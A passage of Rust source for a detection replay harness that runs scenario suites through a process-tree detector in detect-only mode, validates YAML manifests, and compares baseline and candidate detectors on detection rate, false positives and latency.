            return Err(ReplayHarnessError::ScenarioValidation {
                path: scenarios_dir,
                reason: "scenario directory did not contain any .yaml scenarios".to_string(),
            });
        }

        self.evaluate_suite_selection(
            &self.detector,
            scenario_paths,
            ReplaySuiteSelection {
                source: scenarios_dir.display().to_string(),
                source_kind: ReplaySuiteSourceKind::ScenariosDir,
                suite_name: None,
                suite_description: None,
                corpus_version: None,
            },
        )
        .await
    }

    /// Evaluate one named suite manifest and aggregate the result by suite and technique.
    pub async fn evaluate_suite_path(
        &self,
        suite_path: impl AsRef<Path>,
    ) -> Result<ReplaySuiteReport, ReplayHarnessError> {
        let loaded_suite = load_suite_manifest(suite_path)?;
        let scenario_paths = loaded_suite
            .manifest
            .scenarios
            .iter()
            .map(|scenario| resolve_relative_path(&loaded_suite.path, scenario))
            .collect::<Vec<_>>();
        self.evaluate_suite_selection(
            &self.detector,
            scenario_paths,
            ReplaySuiteSelection {
                source: loaded_suite.path.display().to_string(),
                source_kind: ReplaySuiteSourceKind::SuiteManifest,
                suite_name: Some(loaded_suite.manifest.name.clone()),
                suite_description: Some(loaded_suite.manifest.description.clone()),
                corpus_version: Some(loaded_suite.manifest.corpus_version.clone()),
            },
        )
        .await
    }

    /// Evaluate and persist one baseline-vs-candidate detector experiment.
    pub async fn evaluate_experiment_path(
        &self,
        experiment_path: impl AsRef<Path>,
        experiments_dir: impl AsRef<Path>,
    ) -> Result<StrategyExperimentLookup, ReplayHarnessError> {
        let loaded_experiment = load_experiment_manifest(experiment_path)?;
        let suite_path = resolve_relative_path(
            &loaded_experiment.path,
            &loaded_experiment.manifest.corpus.suite,
        );
        let loaded_suite = load_suite_manifest(&suite_path)?;
        let scenario_paths = loaded_suite
            .manifest
            .scenarios
            .iter()
            .map(|scenario| resolve_relative_path(&loaded_suite.path, scenario))
            .collect::<Vec<_>>();
        let selection = ReplaySuiteSelection {
            source: loaded_suite.path.display().to_string(),
            source_kind: ReplaySuiteSourceKind::SuiteManifest,
            suite_name: Some(loaded_suite.manifest.name.clone()),
            suite_description: Some(loaded_suite.manifest.description.clone()),
            corpus_version: Some(loaded_suite.manifest.corpus_version.clone()),
        };

        let baseline_report = self
            .evaluate_suite_selection(&self.detector, scenario_paths.clone(), selection.clone())
            .await?;
        let candidate_detector = detector_from_candidate(&loaded_experiment.manifest.candidate)?;
        let candidate_report = self
            .evaluate_suite_selection(&candidate_detector, scenario_paths, selection)
            .await?;
        let comparison = compare_suite_reports(&baseline_report, &candidate_report);
        let gates = evaluate_experiment_gates(&loaded_experiment.manifest.gates, &comparison);
        let passed = gates.iter().all(|gate| gate.passed);
        let report = StrategyExperimentReport {
            experiment_id: experiment_id_for_manifest(&loaded_experiment.manifest),
            experiment_name: loaded_experiment.manifest.name.clone(),
            description: loaded_experiment.manifest.description.clone(),
            created_at_ms: now_ms(),
            suite_name: loaded_suite.manifest.name.clone(),
            suite_path: loaded_suite.path.display().to_string(),
            corpus_version: loaded_suite.manifest.corpus_version.clone(),
            lineage: loaded_experiment.manifest.lineage.clone(),
            baseline_strategy_id: self.detector.id().to_string(),
            candidate_strategy_id: loaded_experiment
                .manifest
                .candidate
                .strategy_id()
                .to_string(),
            candidate_description: loaded_experiment
                .manifest
                .candidate
                .description()
                .to_string(),
            baseline_report,
            candidate_report,
            comparison,
            gates,
            passed,
        };
        let store = FileExperimentStore::open(experiments_dir.as_ref())?;
        let record = store.persist(&report)?;
        Ok(StrategyExperimentLookup { record, report })
    }

    /// Load a persisted detector experiment by its stable id.
    pub fn load_experiment(
        &self,
        experiments_dir: impl AsRef<Path>,
        experiment_id: &str,
    ) -> Result<Option<StrategyExperimentLookup>, ReplayHarnessError> {
        let store = FileExperimentStore::open(experiments_dir.as_ref())?;
        Ok(store.load(experiment_id)?)
    }

    /// Evaluate one persisted or freshly-executed replay run against repo-owned expectations.
    pub fn evaluate_run(&self, run: &ReplayRunBundle) -> ReplayEvaluationReport {
        let mut checks = Vec::new();
        let summary = &run.deterministic_summary;

        if let Some(expected) = run.expectations.replay_bundle_count {
            checks.push(equality_check(
                "replay_bundle_count",
                json!(expected),
                json!(summary.replay_bundle_count),
                "replay bundle count matched expected scenario output",
            ));
        }
        if let Some(expected) = run.expectations.investigation_count {
            checks.push(equality_check(
                "investigation_count",
                json!(expected),
                json!(summary.investigation_count),
                "investigation bundle count matched expected scenario output",
            ));
        }
        if let Some(expected) = run.expectations.incident_count {
            checks.push(equality_check(
                "incident_count",
                json!(expected),
                json!(summary.incident_count),
                "incident count matched expected scenario output",
            ));
        }

        for expected in &run.expectations.hunts {
            let actual = summary
                .hunts
                .iter()
                .find(|outcome| outcome.hunt_id == expected.hunt_id);
            let (passed, actual_value, details) = match actual {
                Some(actual) => {
                    let actual_value = json!({
                        "action_kind": actual.action_kind,
                        "policy_verdict": actual.policy_verdict,
                        "response_kind": actual.response_kind,
                    });
                    let passed = actual.action_kind == expected.action_kind
                        && actual.policy_verdict == expected.policy_verdict
                        && actual.response_kind == expected.response_kind;
                    let details = if passed {
                        format!(
                            "hunt `{}` matched expected action, policy, and response",
                            expected.hunt_id
                        )
                    } else {
                        format!(
                            "hunt `{}` diverged from expected action, policy, or response",
                            expected.hunt_id
                        )
                    };
                    (passed, actual_value, details)
                }
                None => (
                    false,
                    serde_json::Value::Null,
                    format!(
                        "hunt `{}` was not present in replay output",
                        expected.hunt_id
                    ),
                ),
            };
            checks.push(ReplayEvaluationCheck {
                name: format!("hunt:{}", expected.hunt_id),
                passed,
                expected: json!({
                    "action_kind": expected.action_kind,
                    "policy_verdict": expected.policy_verdict,
                    "response_kind": expected.response_kind,
                }),
                actual: actual_value,
                details,
            });
        }

        if !run.expectations.incident_hunt_groups.is_empty() {
            checks.push(equality_check(
                "incident_hunt_groups",
                json!(normalize_groups(&run.expectations.incident_hunt_groups)),
                json!(normalize_groups(&summary.incident_hunt_groups)),
                "incident hunt group membership matched replay expectations",
            ));
        }

        if let Some(expected) = run.expectations.max_detect_latency_us {
            checks.push(latency_check(
                "max_detect_latency_us",
                expected,
                run.performance.detect.max_latency_us,
            ));
        }
        if let Some(expected) = run.expectations.max_policy_latency_us {
            checks.push(latency_check(
                "max_policy_latency_us",
                expected,
                run.performance.policy.max_latency_us,
            ));
        }
        if let Some(expected) = run.expectations.max_response_latency_us {
            checks.push(latency_check(
                "max_response_latency_us",
                expected,
                run.performance.response.max_latency_us,
            ));
        }

        let passed = checks.iter().all(|check| check.passed);
        ReplayEvaluationReport {
            run_id: run.run_id.clone(),
            scenario_name: run.scenario_name.clone(),
            scenario_path: run.scenario_path.clone(),
            metadata: run.metadata.clone(),
            passed,
            checks,
            deterministic_summary: summary.clone(),
            performance: run.performance.clone(),
        }
    }

    async fn evaluate_suite_selection(
        &self,
        detector: &SupportedDetector,
        scenario_paths: Vec<PathBuf>,
        selection: ReplaySuiteSelection,
    ) -> Result<ReplaySuiteReport, ReplayHarnessError> {
        let mut scenario_reports = Vec::with_capacity(scenario_paths.len());
        for scenario_path in scenario_paths {
            let loaded = load_scenario_manifest(&scenario_path)?;
            let bundle = self.run_loaded_scenario(detector, &loaded).await?;
            let evaluation = self.evaluate_run(&bundle);
            scenario_reports.push(ReplaySuiteScenarioReport {
                scenario_name: bundle.scenario_name.clone(),
                scenario_path: bundle.scenario_path.clone(),
                metadata: bundle.metadata.clone(),
                evaluation,
            });
        }

        let passed_scenarios = scenario_reports
            .iter()
            .filter(|report| report.evaluation.passed)
            .count();
        let failed_scenarios = scenario_reports.len().saturating_sub(passed_scenarios);

        Ok(ReplaySuiteReport {
            source: selection.source,
            source_kind: selection.source_kind,
            suite_name: selection.suite_name,
            suite_description: selection.suite_description,
            corpus_version: selection.corpus_version,
            total_scenarios: scenario_reports.len(),
            passed_scenarios,
            failed_scenarios,
            passed: failed_scenarios == 0,
            technique_groups: technique_groups_from_suite(&scenario_reports),
            scenario_reports,
        })
    }

    async fn run_loaded_scenario(
        &self,
        detector: &SupportedDetector,
        loaded: &LoadedReplayScenario,
    ) -> Result<ReplayRunBundle, ReplayHarnessError> {
        let steps = self.materialize_steps(loaded)?;
        let service = self.build_service();
        let substrate = InMemoryPheromoneSubstrate::new(self.config.pheromone.clone());
        let agent_id = AgentId(loaded.manifest.requested_by.clone());

        let mut replay_bundles = Vec::new();
        for (index, step) in steps.iter().enumerate() {
            let approval = ApprovalContext {
                live_mode: false,
                receipt_chain: loaded.manifest.receipt_chain.clone(),
                now_ms: loaded.manifest.seed_time_ms + index as i64,
            };
            let execution = EventExecutionContext {
                agent_id: &agent_id,
                approval: &approval,
            };

            if let Some(bundle) = service
                .process_event(detector, &substrate, &step.event, execution, |_| {
                    Some(step.action.clone())
                })
                .await?
            {
                replay_bundles.push(bundle);
            }
        }

        let investigation_store = MemoryInvestigationBundleStore::default();
        let investigations = self
            .run_inline_investigations(
                &investigation_store,
                &replay_bundles,
                loaded.manifest.seed_time_ms + 10_000,
            )
            .await?;
        let incidents = self
            .run_inline_correlation(&investigation_store, loaded.manifest.seed_time_ms + 20_000)?;
        let deterministic_summary =
            ReplayDeterministicSummary::from_outputs(&replay_bundles, &investigations, &incidents);

        Ok(ReplayRunBundle {
            run_id: run_id_for_manifest(&loaded.manifest),
            scenario_name: loaded.manifest.name.clone(),
            scenario_path: loaded.path.display().to_string(),
            description: loaded.manifest.description.clone(),
            metadata: loaded.manifest.metadata.clone(),
            input_kind: loaded.manifest.input.kind(),
            seed_time_ms: loaded.manifest.seed_time_ms,
            created_at_ms: loaded.manifest.seed_time_ms,
            requested_by: loaded.manifest.requested_by.clone(),
            expectations: loaded.manifest.expectations.clone(),
            replay_bundles,
            investigations,
            incidents,
            deterministic_summary,
            performance: service.metrics_snapshot(),
        })
    }

    fn build_service(&self) -> RuntimeService<StaticApprovalGate, SandboxExecutor> {
        let mut offline_config = self.config.clone();
        offline_config.runtime.mode = RuntimeMode::DetectOnly;
        offline_config.runtime.require_durable_live_response = false;
        let runtime = SwarmRuntime::new(
            RuntimeMode::DetectOnly,
            StaticApprovalGate {
                human_gate_severity: offline_config.policy.human_gate_severity,
                lease_ttl_ms: offline_config.policy.lease_ttl_ms,
            },
            SandboxExecutor,
        );
        RuntimeService::new(offline_config, runtime)
    }

    fn materialize_steps(
        &self,
        loaded: &LoadedReplayScenario,
    ) -> Result<Vec<ReplayScenarioStep>, ReplayHarnessError> {
        match &loaded.manifest.input {
            ReplayScenarioInput::Events { events } => Ok(events.clone()),
            ReplayScenarioInput::ReplayBundles { paths } => {
                let mut steps = Vec::with_capacity(paths.len());
                for path in paths {
                    let resolved = resolve_relative_path(&loaded.path, path);
                    let raw = fs::read_to_string(&resolved).map_err(|source| {
                        ReplayHarnessError::BundleRead {
                            path: resolved.clone(),
                            source,
                        }
                    })?;
                    let bundle: ReplayBundle = serde_json::from_str(&raw).map_err(|source| {
                        ReplayHarnessError::BundleParse {
                            path: resolved.clone(),
                            source,
                        }
                    })?;
                    steps.push(ReplayScenarioStep {
                        action: bundle.action_request.action,
                        event: bundle.event,
                    });
                }
                Ok(steps)
            }
        }
    }

    async fn run_inline_investigations(
        &self,
        store: &MemoryInvestigationBundleStore,
        replay_bundles: &[ReplayBundle],
        base_time_ms: i64,
    ) -> Result<Vec<InvestigationBundle>, ReplayHarnessError> {
        let investigator = SummaryInvestigator;
        let mut investigations = Vec::with_capacity(replay_bundles.len());

        for (index, replay) in replay_bundles.iter().enumerate() {
            let queued_at_ms = base_time_ms + index as i64 * 10;
            let started_at_ms = queued_at_ms + 1;
            let completed_at_ms = queued_at_ms + 2;
            let investigation_id =
                format!("investigation:{}:{}", replay.audit.hunt_id, queued_at_ms);
            let queued =
                InvestigationBundle::queued_from_bundle(replay, investigation_id, queued_at_ms);
            let running =
                queued.with_status(InvestigationStatus::Running, Some(started_at_ms), None);
            let terminal = match investigator.investigate(replay).await {
                Ok(outcome) => {
                    let mut completed = running.with_summary(
                        outcome.summary,
                        outcome.evidence_points,
                        outcome.correlation_keys,
                        completed_at_ms,
                    );
                    completed.started_at_ms = Some(started_at_ms);
                    completed
                }
                Err(reason) => {
                    let mut failed =
                        running.with_failure(InvestigationStatus::Failed, reason, completed_at_ms);
                    failed.started_at_ms = Some(started_at_ms);
                    failed
                }
            };
            store.persist(&terminal)?;
            investigations.push(terminal);
        }

        Ok(investigations)
    }

    fn run_inline_correlation(
        &self,
        investigation_store: &MemoryInvestigationBundleStore,
        base_time_ms: i64,
    ) -> Result<Vec<CorrelatedIncident>, ReplayHarnessError> {
        let engine = CorrelationEngine::new(offline_correlation_config(&self.config));
        let incident_store = MemoryIncidentStore::default();
        let investigations = investigation_store.recent(usize::MAX)?;
        let mut ordered_hunts = investigations
            .iter()
            .map(|record| record.hunt_id.clone())
            .collect::<Vec<_>>();
        ordered_hunts.sort();
        ordered_hunts.dedup();

        let mut covered_hunts = Vec::<String>::new();
        let mut incidents = Vec::new();
        for (index, hunt_id) in ordered_hunts.into_iter().enumerate() {
            if covered_hunts.iter().any(|existing| existing == &hunt_id) {
                continue;
            }
            let maybe_outcome = engine.correlate_hunt_at(
                investigation_store,
                &incident_store,
                &hunt_id,
                base_time_ms + index as i64,
            )?;
            if let Some(CorrelationOutcome { incident, .. }) = maybe_outcome {
                for included_hunt_id in incident.included_hunt_ids() {
                    if !covered_hunts
                        .iter()
                        .any(|existing| existing == &included_hunt_id)
                    {
                        covered_hunts.push(included_hunt_id);
                    }
                }
                incidents.push(incident);
            }
        }
        incidents.sort_by(|left, right| left.incident_id.cmp(&right.incident_id));
        Ok(incidents)
    }
}

/// Render one replay run in a concise operator-friendly format.
pub fn render_replay_run(run: &ReplayRunBundle) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Run".to_string(),
        format!("Scenario: {}", run.scenario_name),
        format!("Run: {}", run.run_id),
        format!("Source: {:?}", run.input_kind),
        format!(
            "Bundles: {} | investigations: {} | incidents: {}",
            run.deterministic_summary.replay_bundle_count,
            run.deterministic_summary.investigation_count,
            run.deterministic_summary.incident_count
        ),
    ];

    if !run.deterministic_summary.hunts.is_empty() {
        lines.push("Hunts:".to_string());
        for hunt in &run.deterministic_summary.hunts {
            lines.push(format!(
                "- {} action={} verdict={:?} response={}",
                hunt.hunt_id, hunt.action_kind, hunt.policy_verdict, hunt.response_kind
            ));
        }
    }

    if !run.deterministic_summary.incident_hunt_groups.is_empty() {
        lines.push("Incident groups:".to_string());
        for group in &run.deterministic_summary.incident_hunt_groups {
            lines.push(format!("- {}", group.join(", ")));
        }
    }

    lines.join("\n")
}

/// Render one evaluation report for operator review or CI failure output.
pub fn render_evaluation_report(report: &ReplayEvaluationReport) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Evaluation".to_string(),
        format!("Scenario: {}", report.scenario_name),
        format!("Run: {}", report.run_id),
        format!("Status: {}", if report.passed { "pass" } else { "fail" }),
    ];

    for check in &report.checks {
        lines.push(format!(
            "- [{}] {} | expected={} actual={} | {}",
            if check.passed { "pass" } else { "fail" },
            check.name,
            check.expected,
            check.actual,
            check.details
        ));
    }

    lines.join("\n")
}

/// Render a whole-suite replay evaluation report.
pub fn render_suite_report(report: &ReplaySuiteReport) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Suite".to_string(),
        format!("Source: {}", report.source),
        format!(
            "Selection: {}",
            match report.source_kind {
                ReplaySuiteSourceKind::ScenariosDir => "tracked directory",
                ReplaySuiteSourceKind::SuiteManifest => "named suite",
            }
        ),
        format!(
            "Suite: {}",
            report
                .suite_name
                .as_deref()
                .unwrap_or("tracked_scenarios_directory")
        ),
        format!("Status: {}", if report.passed { "pass" } else { "fail" }),
        format!(
            "Totals: {} total | {} passed | {} failed",
            report.total_scenarios, report.passed_scenarios, report.failed_scenarios
        ),
    ];

    if let Some(corpus_version) = &report.corpus_version {
        lines.push(format!("Corpus version: {corpus_version}"));
    }

    if !report.technique_groups.is_empty() {
        lines.push("Techniques:".to_string());
        for group in &report.technique_groups {
            lines.push(format!(
                "- {} | scenarios={} | failing={}",
                group.technique,
                group.total_scenarios,
                group.failing_scenarios.len()
            ));
        }
    }

    for scenario_report in &report.scenario_reports {
        lines.push(format!(
            "- {} [{:?}] [{}]",
            scenario_report.scenario_name,
            scenario_report.metadata.class,
            if scenario_report.evaluation.passed {
                "pass"
            } else {
                "fail"
            }
        ));
        if !scenario_report.metadata.techniques.is_empty() {
            lines.push(format!(
                "  techniques: {}",
                scenario_report.metadata.techniques.join(", ")
            ));
        }
        for check in scenario_report
            .evaluation
            .checks
            .iter()
            .filter(|check| !check.passed)
        {
            lines.push(format!(
                "  failing check: {} | expected={} actual={} | {}",
                check.name, check.expected, check.actual, check.details
            ));
        }
    }

    lines.join("\n")
}

/// Render one persisted detector experiment report.
pub fn render_experiment_report(report: &StrategyExperimentReport) -> String {
    let mut lines = vec![
        "Swarm Team Six Detector Experiment".to_string(),
        format!("Experiment: {}", report.experiment_name),
        format!("Experiment ID: {}", report.experiment_id),
        format!("Suite: {} ({})", report.suite_name, report.corpus_version),
        format!("Baseline: {}", report.baseline_strategy_id),
        format!("Candidate: {}", report.candidate_strategy_id),
        format!("Status: {}", if report.passed { "pass" } else { "fail" }),
        format!(
            "Detection rate: {:.2} -> {:.2}",
            report.comparison.baseline.detection_rate, report.comparison.candidate.detection_rate
        ),
        format!(
            "False positive rate: {:.2} -> {:.2}",
            report.comparison.baseline.false_positive_rate,
            report.comparison.candidate.false_positive_rate
        ),
        format!(
            "Max detect latency us: {} -> {}",
            report.comparison.baseline.max_detect_latency_us,
            report.comparison.candidate.max_detect_latency_us
        ),
    ];

    lines.push("Gates:".to_string());
    for gate in &report.gates {
        lines.push(format!(
            "- [{}] {} | expected={} actual={} | {}",
            if gate.passed { "pass" } else { "fail" },
            gate.name,
            gate.expected,
            gate.actual,
            gate.details
        ));
    }

    if !report.comparison.scenario_regressions.is_empty() {
        lines.push("Scenario regressions:".to_string());
        for regression in &report.comparison.scenario_regressions {
            lines.push(format!(
                "- {} [{:?}] | {}",
                regression.scenario_name, regression.class, regression.reason
            ));
        }
    }

    if !report.comparison.technique_regressions.is_empty() {
        lines.push("Technique regressions:".to_string());
        for regression in &report.comparison.technique_regressions {
            lines.push(format!(
                "- {} | {}",
                regression.technique,
                regression.scenarios.join(", ")
            ));
        }
    }

    lines.join("\n")
}

fn supported_detector(config: &SwarmConfig) -> Result<SupportedDetector, ReplayHarnessError> {
    match config.detection.strategy.as_str() {
        "suspicious_process_tree" => Ok(SupportedDetector::suspicious_process_tree(
            config.detection.strategy.clone(),
            SuspiciousProcessTreeProfile {
                high_confidence_threshold: config.detection.high_confidence_threshold,
                medium_confidence_threshold: config.detection.medium_confidence_threshold,
                ..SuspiciousProcessTreeProfile::default()
            },
        )),
        other => Err(ReplayHarnessError::UnsupportedDetector {
            strategy: other.to_string(),
        }),
    }
}

fn detector_from_candidate(
    candidate: &DetectorCandidateManifest,
) -> Result<SupportedDetector, ReplayHarnessError> {
    match candidate {
        DetectorCandidateManifest::SuspiciousProcessTree {
            strategy_id,
            profile,
            ..
        } => Ok(SupportedDetector::suspicious_process_tree(
            strategy_id.clone(),
            profile.clone(),
        )),
    }
}

fn equality_check(
    name: &str,
    expected: serde_json::Value,
    actual: serde_json::Value,
    success_details: &str,
) -> ReplayEvaluationCheck {
    let passed = expected == actual;
    ReplayEvaluationCheck {
        name: name.to_string(),
        passed,
        expected,
        actual,
        details: if passed {
            success_details.to_string()
        } else {
            format!("{name} did not match expected replay output")
        },
    }
}

fn latency_check(name: &str, expected_max: u64, actual_max: u64) -> ReplayEvaluationCheck {
    let passed = actual_max <= expected_max;
    ReplayEvaluationCheck {
        name: name.to_string(),
        passed,
        expected: json!(expected_max),
        actual: json!(actual_max),
        details: if passed {
            format!("{name} stayed within configured replay threshold")
        } else {
            format!("{name} exceeded configured replay threshold")
        },
    }
}

fn run_id_for_manifest(manifest: &ReplayScenarioManifest) -> String {
    format!("replay_run:{}:{}", manifest.name, manifest.seed_time_ms)
}

fn experiment_id_for_manifest(manifest: &DetectorExperimentManifest) -> String {
    format!(
        "experiment:{}:{}",
        manifest.name,
        manifest.candidate.strategy_id()
    )
}

fn load_scenario_manifest(
    path: impl AsRef<Path>,
) -> Result<LoadedReplayScenario, ReplayHarnessError> {
    let path = path.as_ref().to_path_buf();
    let raw = fs::read_to_string(&path).map_err(|source| ReplayHarnessError::ScenarioRead {
        path: path.clone(),
        source,
    })?;
    let manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&raw).map_err(|source| {
        ReplayHarnessError::ScenarioParse {
            path: path.clone(),
            source,
        }
    })?;
    validate_manifest(&path, &manifest)?;
    Ok(LoadedReplayScenario { path, manifest })
}

fn load_suite_manifest(path: impl AsRef<Path>) -> Result<LoadedReplaySuite, ReplayHarnessError> {
    let path = path.as_ref().to_path_buf();
    let raw = fs::read_to_string(&path).map_err(|source| ReplayHarnessError::SuiteRead {
        path: path.clone(),
        source,
    })?;
    let manifest = serde_yaml::from_str::<ReplaySuiteManifest>(&raw).map_err(|source| {
        ReplayHarnessError::SuiteParse {
            path: path.clone(),
            source,
        }
    })?;
    validate_suite_manifest(&path, &manifest)?;
    Ok(LoadedReplaySuite { path, manifest })
}

fn load_experiment_manifest(
    path: impl AsRef<Path>,
) -> Result<LoadedDetectorExperiment, ReplayHarnessError> {
    let path = path.as_ref().to_path_buf();
    let raw = fs::read_to_string(&path).map_err(|source| ReplayHarnessError::ExperimentRead {
        path: path.clone(),
        source,
    })?;
    let manifest = serde_yaml::from_str::<DetectorExperimentManifest>(&raw).map_err(|source| {
        ReplayHarnessError::ExperimentParse {
            path: path.clone(),
            source,
        }
    })?;
    validate_experiment_manifest(&path, &manifest)?;
    Ok(LoadedDetectorExperiment { path, manifest })
}

fn validate_manifest(
    path: &Path,
    manifest: &ReplayScenarioManifest,
) -> Result<(), ReplayHarnessError> {
    if manifest.name.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "scenario name must not be empty".to_string(),
        });
    }
    if manifest.description.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "scenario description must not be empty".to_string(),
        });
    }
    if manifest.seed_time_ms <= 0 {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "seed_time_ms must be greater than zero".to_string(),
        });
    }
    if manifest.requested_by.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "requested_by must not be empty".to_string(),
        });
    }
    match &manifest.input {
        ReplayScenarioInput::Events { events } if events.is_empty() => {
            return Err(ReplayHarnessError::ScenarioValidation {
                path: path.to_path_buf(),
                reason: "event-backed scenarios must include at least one event".to_string(),
            });
        }
        ReplayScenarioInput::ReplayBundles { paths } if paths.is_empty() => {
            return Err(ReplayHarnessError::ScenarioValidation {
                path: path.to_path_buf(),
                reason: "bundle-backed scenarios must include at least one path".to_string(),
            });
        }
        ReplayScenarioInput::Events { .. } | ReplayScenarioInput::ReplayBundles { .. } => {}
    }
    Ok(())
}

fn validate_suite_manifest(
    path: &Path,
    manifest: &ReplaySuiteManifest,
) -> Result<(), ReplayHarnessError> {
    if manifest.name.trim().is_empty() {
        return Err(ReplayHarnessError::SuiteValidation {
            path: path.to_path_buf(),
            reason: "suite name must not be empty".to_string(),
        });
    }
    if manifest.description.trim().is_empty() {
        return Err(ReplayHarnessError::SuiteValidation {
            path: path.to_path_buf(),
            reason: "suite description must not be empty".to_string(),
        });
    }
    if manifest.corpus_version.trim().is_empty() {
        return Err(ReplayHarnessError::SuiteValidation {
            path: path.to_path_buf(),
            reason: "corpus_version must not be empty".to_string(),
        });
    }
    if manifest.scenarios.is_empty() {
        return Err(ReplayHarnessError::SuiteValidation {
            path: path.to_path_buf(),
            reason: "suite must reference at least one scenario".to_string(),
        });
    }
    Ok(())
}

fn validate_experiment_manifest(
    path: &Path,
    manifest: &DetectorExperimentManifest,
) -> Result<(), ReplayHarnessError> {
    if manifest.name.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "experiment name must not be empty".to_string(),
        });
    }
    if manifest.description.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "experiment description must not be empty".to_string(),
        });
    }
    if manifest.corpus.suite.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "experiment must reference a suite path".to_string(),
        });
    }
    if manifest.lineage.parent_strategy_id.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "lineage.parent_strategy_id must not be empty".to_string(),
        });
    }
    if manifest.lineage.mutation.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "lineage.mutation must not be empty".to_string(),
        });
    }
    if manifest.lineage.rationale.trim().is_empty() {
        return Err(ReplayHarnessError::ExperimentValidation {
            path: path.to_path_buf(),
            reason: "lineage.rationale must not be empty".to_string(),
        });
    }
    match &manifest.candidate {
        DetectorCandidateManifest::SuspiciousProcessTree {
            strategy_id,
            description,
            profile,
        } => {
            if strategy_id.trim().is_empty() {
                return Err(ReplayHarnessError::ExperimentValidation {
                    path: path.to_path_buf(),
                    reason: "candidate strategy_id must not be empty".to_string(),
                });
            }
            if description.trim().is_empty() {
                return Err(ReplayHarnessError::ExperimentValidation {
                    path: path.to_path_buf(),
                    reason: "candidate description must not be empty".to_string(),
                });
            }
            if profile.suspicious_parents.is_empty() || profile.suspicious_children.is_empty() {
                return Err(ReplayHarnessError::ExperimentValidation {
                    path: path.to_path_buf(),
                    reason: "candidate profile must include suspicious parents and children"
                        .to_string(),
                });
            }
        }
    }
    Ok(())
}

fn resolve_relative_path(manifest_path: &Path, referenced: &str) -> PathBuf {
    let candidate = PathBuf::from(referenced);
    if candidate.is_absolute() {
        candidate
    } else {
        manifest_path
            .parent()
            .unwrap_or_else(|| Path::new("."))
            .join(candidate)
    }
}

fn scenario_paths_in_dir(scenarios_dir: &Path) -> Result<Vec<PathBuf>, ReplayHarnessError> {
    let entries =
        fs::read_dir(scenarios_dir).map_err(|source| ReplayHarnessError::ScenarioRead {
            path: scenarios_dir.to_path_buf(),
            source,
        })?;
    let mut paths = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().and_then(|ext| ext.to_str()) == Some("yaml"))
        .collect::<Vec<_>>();
    paths.sort();
    Ok(paths)
}

fn normalize_groups(groups: &[Vec<String>]) -> Vec<Vec<String>> {
    let mut normalized = groups
        .iter()
        .map(|group| {
            let mut sorted = group.clone();
            sorted.sort();
            sorted.dedup();
            sorted
        })
        .collect::<Vec<_>>();
    normalized.sort();
    normalized
}

fn technique_groups_from_suite(
    reports: &[ReplaySuiteScenarioReport],
) -> Vec<ReplayTechniqueGroupReport> {
    let mut groups = BTreeMap::<String, ReplayTechniqueGroupReport>::new();
    for report in reports {
        for technique in &report.metadata.techniques {
            let entry =
                groups
                    .entry(technique.clone())
                    .or_insert_with(|| ReplayTechniqueGroupReport {
                        technique: technique.clone(),
                        total_scenarios: 0,
                        failing_scenarios: Vec::new(),
                    });
            entry.total_scenarios += 1;
            if !report.evaluation.passed {
                entry.failing_scenarios.push(report.scenario_name.clone());
            }
        }
    }

    groups.into_values().collect()
}

fn compare_suite_reports(
    baseline: &ReplaySuiteReport,
    candidate: &ReplaySuiteReport,
) -> StrategyExperimentComparison {
    let baseline_metrics = suite_metrics(baseline);
    let candidate_metrics = suite_metrics(candidate);
    let baseline_by_path = baseline
        .scenario_reports
        .iter()
        .map(|report| (report.scenario_path.as_str(), report))
        .collect::<BTreeMap<_, _>>();
    let candidate_by_path = candidate
        .scenario_reports
        .iter()
        .map(|report| (report.scenario_path.as_str(), report))
        .collect::<BTreeMap<_, _>>();

    let mut scenario_regressions = Vec::new();
    for (scenario_path, baseline_report) in baseline_by_path {
        let Some(candidate_report) = candidate_by_path.get(scenario_path) else {
            continue;
        };

        if scenario_expected_positive(baseline_report)
            && scenario_detected(baseline_report)
            && !scenario_detected(candidate_report)
        {
            scenario_regressions.push(StrategyScenarioRegression {
                scenario_name: baseline_report.scenario_name.clone(),
                scenario_path: baseline_report.scenario_path.clone(),
                class: baseline_report.metadata.class,
                techniques: baseline_report.metadata.techniques.clone(),
                reason: "candidate missed expected adversarial detection".to_string(),
            });
        } else if scenario_is_benign(baseline_report)
            && !scenario_detected(baseline_report)
            && scenario_detected(candidate_report)
        {
            scenario_regressions.push(StrategyScenarioRegression {
                scenario_name: baseline_report.scenario_name.clone(),
                scenario_path: baseline_report.scenario_path.clone(),
                class: baseline_report.metadata.class,
                techniques: baseline_report.metadata.techniques.clone(),
                reason: "candidate introduced a benign false positive".to_string(),
            });
        }
    }

    let mut technique_groups = BTreeMap::<String, Vec<String>>::new();
    for regression in &scenario_regressions {
        if regression.class != ReplayScenarioClass::Adversarial {
            continue;
        }
        for technique in &regression.techniques {
            technique_groups
                .entry(technique.clone())
                .or_default()
                .push(regression.scenario_name.clone());
        }
    }
    let technique_regressions = technique_groups
        .into_iter()
        .map(|(technique, mut scenarios)| {
            scenarios.sort();
            scenarios.dedup();
            StrategyTechniqueRegression {
                technique,
                scenarios,
            }
        })
        .collect::<Vec<_>>();

    StrategyExperimentComparison {
        delta: StrategyExperimentMetricDelta {
            detection_rate_delta: candidate_metrics.detection_rate
                - baseline_metrics.detection_rate,
            false_positive_rate_delta: candidate_metrics.false_positive_rate
                - baseline_metrics.false_positive_rate,
            max_detect_latency_delta_us: candidate_metrics.max_detect_latency_us as i64
                - baseline_metrics.max_detect_latency_us as i64,
